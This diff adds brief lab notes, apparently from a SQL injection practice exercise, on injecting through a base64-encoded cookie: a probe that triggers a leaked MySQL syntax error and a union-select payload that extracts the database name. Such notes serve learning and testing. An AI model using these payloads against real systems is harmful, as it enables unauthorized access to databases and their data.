@@ -1,0 +1,14 @@
+[complex character cookie injection]
+when we first add a cookie with value as "admin" encrypted in base64 we get
+
+Your Login name:admin
+Your Password:1
+Your ID:8
+
+cookie value as admin' and 1=1
+encrypted in base 64 an error is triggered in the mysql syntax
+Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') 
+LIMIT 0,1' at line 1
+payload=1admin') union select 1,(select database()),3#
+encrypted in base64 
+(--+ does not work)
